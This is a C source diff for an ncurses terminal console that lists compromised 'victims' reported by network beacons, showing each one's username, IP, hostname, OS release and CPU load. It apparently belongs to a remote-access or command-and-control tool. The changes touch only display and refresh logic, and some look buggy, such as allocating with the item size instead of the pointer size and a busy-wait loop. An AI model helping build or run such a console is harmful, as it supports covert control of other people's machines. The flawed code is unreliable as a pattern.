@@ -166,9 +166,9 @@ char *ncurses_victim_desc_0(char *s0, char *s2){
 
 char *ncurses_victim_desc_1(char *s0, char *s1, char *s2, char *s3){
   char *arch = "arch:";
-  char *release = "release: ";
-  char *hostname = "hostname: ";
-  char *load = "load: ";
+  char *release = "release:";
+  char *hostname = "hostname:";
+  char *load = "load:";
   char *space = " ";
   char *result = malloc(strlen(arch) +
                         strlen(s0) +
@@ -196,16 +196,15 @@ char *ncurses_victim_desc_1(char *s0, char *s1, char *s2, char *s3){
 }
 
 bool ncurses_item_victims(ITEM **items, net_client_beacon_t **p_victims){
-  int j = 0;
   for(int i = 0; i < NET_MAX_CLIENTS; ++i){
+    free_item(items[i]);
     if (p_victims[i] != NULL){
-      items[j] = new_item(ncurses_victim_desc_0(p_victims[i]->sysinfo.username,
+      items[i] = new_item(ncurses_victim_desc_0(p_victims[i]->sysinfo.username,
                                                 p_victims[i]->sysinfo.ip),
                           ncurses_victim_desc_1(p_victims[i]->sysinfo.arch,
                                                 p_victims[i]->sysinfo.release,
                                                 p_victims[i]->sysinfo.hostname,
                                                 itoa(p_victims[i]->sysinfo.cpu_usage)));
-      j++;
     }
   }
   return true;
@@ -261,9 +260,9 @@ bool ncurses_wmain(int action, net_client_beacon_t **p_victims){
     box(win_main, 0, 0);
     ncurses_window_title(win_main, win_main_title);
     ncurses_window_footer(win_main, win_main_version);
-    items = (ITEM **)calloc(NET_VICTIMS_TOTAL, sizeof(ITEM *));
+    items = malloc(NET_MAX_CLIENTS * sizeof(ITEM));
     ncurses_item_victims(items, p_victims);
-    menu = new_menu((ITEM **)items);
+    menu = new_menu(items);
     wmove(win_menu, 4, 2);
     wresize(win_menu, (y - (y_margin * 2)), (x - (x_margin * 2)));
     set_menu_win(menu, win_menu);
@@ -292,9 +291,12 @@ typedef struct{
 
 void *ncurses_pthread_refresh(void *args){
   ncurses_pthread_refresh_args_t *p_args = args;
+  int n_victims = NET_VICTIMS_TOTAL;
   while (true){
-    ncurses_wmain(NCURSES_WMAIN_UPDATE, p_args->p_victims);
-    sleep(1);
+    if (n_victims != NET_VICTIMS_TOTAL){
+      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_args->p_victims);
+      n_victims = NET_VICTIMS_TOTAL;
+    }
   }
   pthread_exit(NULL);
 }
@@ -306,10 +308,12 @@ bool ncurses_main(){
   */
 
   int key;
-  
+
   net_client_beacon_t **p_victims = net_create_victims();
   
   ncurses_wmain(NCURSES_WMAIN_INIT, p_victims);
+
+  ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
 
   pthread_t t_ncurses_pthread_refresh;
   ncurses_pthread_refresh_args_t *p_ncurses_pthread_refresh_args = malloc(sizeof(ncurses_pthread_refresh_args_t));
@@ -319,15 +323,16 @@ bool ncurses_main(){
   while(true){
     key = getch();
     if (key == KEY_RESIZE){
+      usleep(50000);
       ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
     }
     if (key == KEY_DOWN){
       menu_driver(menu, REQ_DOWN_ITEM);
-      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
+      wrefresh(win_menu);
     }
     if (key == KEY_UP){
       menu_driver(menu, REQ_UP_ITEM);
-      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
+      wrefresh(win_menu);
     }
   }
   ncurses_menu_cleanup(menu);
